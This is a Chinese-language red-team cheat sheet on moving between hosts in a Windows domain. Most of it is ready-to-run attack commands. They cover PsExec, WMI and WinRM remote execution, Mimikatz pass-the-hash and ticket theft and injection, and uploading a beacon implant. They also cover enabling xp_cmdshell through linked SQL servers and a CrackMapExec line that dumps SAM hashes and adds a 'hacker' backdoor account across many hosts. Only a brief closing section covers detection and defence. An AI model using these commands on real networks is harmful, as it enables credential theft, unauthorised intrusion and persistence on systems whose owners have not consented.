# 横向移动技术：内域网内移动

---

## 📋 目录

1. [横向移动概述](#一概述)
2. [SMB 横向移动](#二smb-横向)
3. [WMI 横向移动](#三wmi-横向)
4. [WinRM 横向移动](#四winrm-横向)
5. [RDP 横向移动](#五rdp-横向)
6. [Pass-the-Hash](#六pass-the-hash)
7. [Pass-the-Ticket](#七pass-the-ticket)
8. [Overpass-the-Hash](#八overpass-the-hash)
9. [SQL Server 横向](#九sql-server)
10. [批量工具链](#十批量工具)
11. [检测与防御](#十一检测防御)

---

## 一、概述

```
横向移动 = 从已控制的主机移动到同网络内其他主机

前提：拥有目标主机的有效凭据(密码/NTLM Hash/Kerberos票据)

核心协议：
  SMB (445)    → PsExec, smbexec
  WMI (135+)   → wmiexec, wmic
  WinRM (5985/5986) → Enter-PSSession, evil-winrm
  RDP (3389)   → 远程桌面
  SQL (1433)   → xp_cmdshell
  SSH (22)     → ssh/pssh

凭据类型：
  明文密码      → 直接使用
  NTLM Hash    → Pass-the-Hash
  AES Key      → Overpass-the-Hash
  Kerberos票据  → Pass-the-Ticket
```

---

## 二、SMB 横向

### PsExec

```bash
# === 原理 ===
# PsExec 通过 SMB(445) 上传服务程序到 ADMIN$ 共享
# → 启动服务 → 执行命令 → 删除服务

# === Sysinternals PsExec ===
PsExec.exe \\10.0.1.100 -u DOMAIN\admin -p Password123 cmd.exe
PsExec.exe \\10.0.1.100 -s cmd.exe              # SYSTEM权限
PsExec.exe \\10.0.1.100 -c beacon.exe            # 上传+执行

# === Impacket psexec ===
psexec.py DOMAIN/admin:Password123@10.0.1.100
psexec.py -hashes :<NTLM_HASH> DOMAIN/admin@10.0.1.100

# === 日志特征 ===
# Event 7045: 新服务创建 (PSEXESVC-XXXX)
# 防御: 监控随机名称的服务创建
```

### smbexec

```bash
# smbexec = 比 psexec 更隐蔽
# 不创建服务，而是通过 SMB 写 bat 文件 + 创建服务执行 bat
# → 日志特征不同

smbexec.py DOMAIN/admin:Password123@10.0.1.100
smbexec.py -hashes :<HASH> DOMAIN/admin@10.0.1.100
```

---

## 三、WMI 横向

```bash
# === wmic (Windows原生) ===
wmic /node:10.0.1.100 /user:DOMAIN\admin /password:Password123 \
  process call create "cmd.exe /c whoami > C:\temp\out.txt"

# === Impacket wmiexec (半交互) ===
wmiexec.py DOMAIN/admin:Password123@10.0.1.100
wmiexec.py -hashes :<HASH> DOMAIN/admin@10.0.1.100

# === PowerShell ===
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\admin", (ConvertTo-SecureString "Password123" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create \
  -ArgumentList "powershell.exe -enc <B64>" \
  -ComputerName 10.0.1.100 -Credential $cred

# === WMI 特点 ===
# 优点: 不落地文件(除输出)
# 缺点: 需要135+高端口(防火墙可能限制)
# 日志: Event 4688 (wmic.exe + 子进程)
```

---

## 四、WinRM 横向

```powershell
# === 前提: WinRM 启用 ===
# Enable-PSRemoting -Force (管理员)
# winrm quickconfig

# === Enter-PSSession (交互式) ===
$cred = Get-Credential DOMAIN\admin
Enter-PSSession -ComputerName 10.0.1.100 -Credential $cred

# === Invoke-Command (非交互) ===
Invoke-Command -ComputerName 10.0.1.100 -ScriptBlock { whoami } -Credential $cred

# 批量执行:
Invoke-Command -ComputerName (Get-Content hosts.txt) -ScriptBlock { whoami } -Credential $cred
```

```bash
# === Linux: evil-winrm ===
evil-winrm -i 10.0.1.100 -u admin -p Password123
evil-winrm -i 10.0.1.100 -u admin -H <NTLM_HASH>  # Pass-the-Hash

# evil-winrm 功能:
# upload beacon.exe C:\Windows\Temp\b.exe
# download C:\Users\admin\Desktop\secret.txt
# services  # 列出服务
```

---

## 五、RDP 横向

```bash
# === RDP 登录 ===
xfreerdp /v:10.0.1.100 /u:DOMAIN\admin /p:Password123
xfreerdp /v:10.0.1.100 /u:DOMAIN\admin /pth:<NTLM_HASH>  # Pass-the-Hash RDP
# (需要 Restricted Admin 模式)

# === 启用 Restricted Admin ===
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# === RDP 隧道(端口转发) ===
# 通过被控主机建立 SOCKS 代理
# proxychains + xfreerdp 访问内网RDP
```

---

## 六、Pass-the-Hash

```bash
# PtH = 用 NTLM Hash 代替明文密码认证
# 前提: 目标启用 NTLM 认证(默认开启)

# === Mimikatz ===
mimikatz "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:cmd.exe"
# → 打开新cmd，所有网络认证自动使用此Hash

# === Impacket (所有工具都支持 -hashes) ===
psexec.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.0.1.100
wmiexec.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.0.1.100
smbclient.py -hashes :<NTLM_HASH> DOMAIN/Administrator@10.0.1.100

# === CrackMapExec ===
crackmapexec smb 10.0.1.100 -u Administrator -H <NTLM_HASH>
crackmapexec smb 10.0.1.100 -u Administrator -H <NTLM_HASH> -x whoami

# === PtH 条件 ===
# 需要: 本地管理员权限(高完整性) → 才能操作LSASS
# 或: SeDebugPrivilege
# UAC Remote Restrictions (非RID 500的admin可能受限)
```

---

## 七、Pass-the-Ticket

```bash
# 导出 Kerberos 票据
mimikatz "sekurlsa::tickets /export"
# → 导出多个 .kirbi 文件

# 注入票据
mimikatz "kerberos::ptt ticket.kirbi"
# → 当前会话可以访问票据对应的服务

# 验证
klist  # 查看当前Kerberos票据
dir \\DC01\C$  # 测试访问

# === PtT vs PtH ===
# PtH: 需要NTLM Hash + NTLM认证开启
# PtT: 需要Kerberos票据(TGT/ST) + Kerberos认证

# === Silver Ticket (PtT 特殊形式) ===
# 自己伪造TGS→不需要从目标提取
```

---

## 八、Overpass-the-Hash

```bash
# Overpass-the-Hash = 用 NTLM Hash 请求 Kerberos TGT
# 将 NTLM Hash → 转换成 Kerberos 票据

# Mimikatz:
mimikatz "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:cmd.exe"

# 在新cmd中:
dir \\DC01\C$  # → 自动请求TGT → 用Kerberos访问
# 而不是用NTLM!

# 优势: 能绕过NTLM被禁用的情况
# (Protected Users组禁用NTLM → 必须用Kerberos)
```

---

## 九、SQL Server 横向

```sql
-- MSSQL 横向移动

-- 1. 枚举链接服务器
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- 2. 通过链接服务器执行命令
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- 3. 如果 xp_cmdshell 禁用:
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 4. 提取其他数据库的凭据
-- 如果有其他MSSQL的连接信息
```

---

## 十、批量工具

### CrackMapExec 批量

```bash
# 验证凭据有效性
crackmapexec smb 10.0.1.0/24 -u admin -p Password123
crackmapexec smb 10.0.1.0/24 -u admin -H <NTLM_HASH>
crackmapexec smb 10.0.1.0/24 -u admin -p Password123 --local-auth

# 批量执行命令
crackmapexec smb hosts.txt -u admin -p Password123 -x "net user hacker Pass123 /add"
crackmapexec smb hosts.txt -u admin -p Password123 -M mimikatz

# 批量提取SAM
crackmapexec smb hosts.txt -u admin -p Password123 --sam

# MSSQL
crackmapexec mssql 10.0.1.0/24 -u sa -p Password123 -x whoami

# WinRM
crackmapexec winrm 10.0.1.0/24 -u admin -p Password123 -x whoami

# RDP
crackmapexec rdp 10.0.1.0/24 -u admin -p Password123
```

---

## 十一、检测与防御

```
检测横向移动的关键日志：

Event ID 4688 — 新进程创建 (关注父进程链)
Event ID 4624 — 登录事件 (LogonType 3=网络, 10=远程交互)
Event ID 7045 — 新服务创建
Event ID 5140 — 网络共享访问
Event ID 4672 — 特殊权限登录

防御:
  ✓ 网络分段 (不同区域VLAN隔离)
  ✓ LAPS (本地管理员密码随机化 → 无法用同一密码横向)
  ✓ Protected Users 组(禁用NTLM,强制Kerberos AES)
  ✓ EDR监控异常进程链 + 横向移动特征
  ✓ 禁用不必要的协议 (WMI/WinRM如不需要)
```

---

## ✅ Checklist

- [ ] SMB 横向 (PsExec/smbexec)
- [ ] WMI 横向 (wmic/wmiexec)
- [ ] WinRM 横向 (Enter-PSSession/evil-winrm)
- [ ] RDP 横向
- [ ] Pass-the-Hash
- [ ] Pass-the-Ticket
- [ ] Overpass-the-Hash
- [ ] SQL Server 横向 (xp_cmdshell)
- [ ] 批量工具 (CrackMapExec)
